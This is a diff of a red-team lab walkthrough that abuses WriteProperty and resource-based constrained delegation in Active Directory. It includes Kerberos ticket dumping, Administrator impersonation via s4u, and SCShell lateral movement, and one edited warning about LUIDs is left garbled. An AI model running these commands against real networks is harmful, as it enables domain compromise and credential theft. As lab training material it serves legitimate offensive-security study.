@@ -2,8 +2,6 @@
 
 >The objective of this lab is to combine a `WriteProperty` privilege and Resource-Based Constrained Delegation (RBCD) to compromise a computer.  
 
-===
-
 ## SOCKS
 
 1. Launch Cobalt Strike and connect to the team server.  
@@ -37,6 +35,8 @@
     4. Action: **Proxy SOCKS5 10.0.0.5**
     5. Click **OK**.
     6. Click **OK** again.
+
+<img src="/images/rbcd_lab04.png">
 
 ### DNS
 
@@ -76,7 +76,7 @@ Add-Content -Path C:\Windows\System32\drivers\etc\hosts -Value "10.10.120.1 lon-
 C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /ticket:[TGT] /service:ldap/lon-dc-1 /dc:lon-dc-1 /ptt
 ```
 
->Setup done.  
+>Setup ready.  
 
 ===
 
@@ -101,13 +101,15 @@ Get-DomainObject -LDAPFilter '(objectSid=S-1-5-21-3926355307-1661546229-81304788
 
 ⚠️ This will show that it's a domain group called "Server Admins", and that *rsteel* is a member.🔍
 
+<img src="/images/rbcd_lab05.png">  
+
 4. Go back to Cobalt Strike and use the high-integrity Beacon running in 🔥SYSTEM beacon to dump 🗝️ the TGT for rsteel.
 
 ```
 krb_triage
 ```
     
-> ⚠️ Lab-confirmed (2026-04-19): LUID varies per session — do NOT hardcode `/luid:244f58`. Always run `krb_triage` first to find the current rsteel LUID (e.g. `0x1e7efb` in this run).
+> ⚠️ LUID `/luid:244f58`. Always run `krb_triage` first to find the current rsteel LUID (e.g. `0x1e7efb` in this run).
     
 ```
 krb_dump /luid:<rsteel-LUID-from-krb_triage> /service:krbtgt
@@ -115,7 +117,10 @@ krb_dump /luid:<rsteel-LUID-from-krb_triage> /service:krbtgt
     
     > OPSEC-🟠CAUTION — BOF, uses `LsaCallAuthenticationPackage` Kerberos API. No raw LSASS read.
     > ⚠️ Use `/luid:1e7efb` NOT `/luid:0x1e7efb` — Kerbeus-BOF rejects 0x prefix ("Invalid luid").
-    
+    > output base64 ticket = [BASE64_from_krb_dump_luid_TGT_RSTEEL] copy to clipboard  
+
+<img src="/images/rbcd_lab06.png">  
+
 5. Before using the above output base64 ticket for `rsteal` we need to purge `pchilds`. In the netonly process on the Attacker Desktop, purge LDAP ticket for pchilds.
 
 ```PowerShell
@@ -125,7 +130,7 @@ C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe purge
 6. Request a new LDAP service ticket with `rsteel` TGT, and paste in rsteel TGT base64 ticket given us LDAP tgt ticket.
 
 ```PowerShell
-C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /ticket:[TGT_RSTEEL] /service:ldap/lon-dc-1 /dc:lon-dc-1 /ptt
+C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /ticket:[BASE64_from_krb_dump_luid_TGT_RSTEEL] /service:ldap/lon-dc-1 /dc:lon-dc-1 /ptt
 ```
 
 ===
@@ -158,12 +163,15 @@ Get-ADComputer -Filter * -Properties PrincipalsAllowedToDelegateToAccount -Serve
 Get-ADComputer -Identity 'lon-fs-1' -Properties PrincipalsAllowedToDelegateToAccount -Server 'lon-dc-1' | select Name,PrincipalsAllowedToDelegateToAccount
 ```
 
-4. Go back to Cobalt Strike beacon, and dump 🗝️  TGT for *lon-wkstn-1* from high integrity 🔥system user beacon to enable exploitation using workstation tgt.  
+<img src="/images/rbcd_lab07.png">  
+
+4. Go back to Cobalt Strike beacon, and dump 🗝️  TGT for `lon-wkstn-1` from high integrity 🔥system user beacon to enable exploitation using workstation tgt.  
 
 ```
 krb_dump /luid:3e7 /service:krbtgt
 ```
     
+> base64 Output [krb_dump_output_for_lon-wkstn-1_TGT]
 > OPSEC-🟠CAUTION — BOF, Kerberos API. Requires 🔥SYSTEM context. `/luid:3e7` = machine account session — always present on domain-joined host.  
 > ⚠️ NO 0x prefix — `/luid:0x3e7` = "Invalid luid" error (Kerbeus-BOF lab-confirmed).  
     
@@ -171,7 +179,7 @@ krb_dump /luid:3e7 /service:krbtgt
 >Request a usable service ticket for *cifs/lon-fs-1*, impersonating the default domain administrator.  
   
 ```PowerShell-nocolor
-C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:lon-wkstn-1$ /impersonateuser:Administrator /msdsspn:cifs/lon-fs-1 /ticket:[TGT] /dc:lon-dc-1 /outfile:C:\Users\Attacker\Desktop\
+C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:lon-wkstn-1$ /impersonateuser:Administrator /msdsspn:cifs/lon-fs-1 /ticket:[krb_dump_output_for_lon-wkstn-1_TGT] /dc:lon-dc-1 /outfile:C:\Users\Attacker\Desktop\
 ```
 
 > OPSEC-🟢SAFE — Rubeus runs on the attacker desktop, not via beacon, files written locally only to Attacker desktop.  
@@ -193,15 +201,18 @@ kerberos_ticket_use C:\Users\Attacker\Desktop\_cifs_lon-fs-1
 ls \\lon-fs-1\c$
 ```
 
-> ⚠️ 🔥 make_token was **not needed** and `ls \\lon-fs-1\c$` succeeded. The remote server validates the Kerberos ticket content, not the local session identity — `kerberos_ticket_use` injects the ticket into the current beacon logon session directly.
+> ⚠️ 🔥 make_token **not needed** and `ls \\lon-fs-1\c$` succeeded. The remote server validates the Kerberos ticket content, not the local session identity — `kerberos_ticket_use` injects the ticket into the current beacon logon session directly.
 
-Cleanup — revoke token and purge ticket:
+<img src="/images/rbcd_lab08.png">  
 
 ```cs
-rev2self
-kerberos_ticket_purge
+C:\Tools\SCShell\CS-BOF\scshell.cna
+ak-settings spawnto_x64 C:\Windows\System32\svchost.exe
+jump scshell64 lon-fs-1 smb
 ```  
-    
+
+<img src="/images/rbcd_lab09.png">    
+
 7. On the Attacker Desktop, restore the RBCD configuration back to how it was.
 
 ```PowerShell
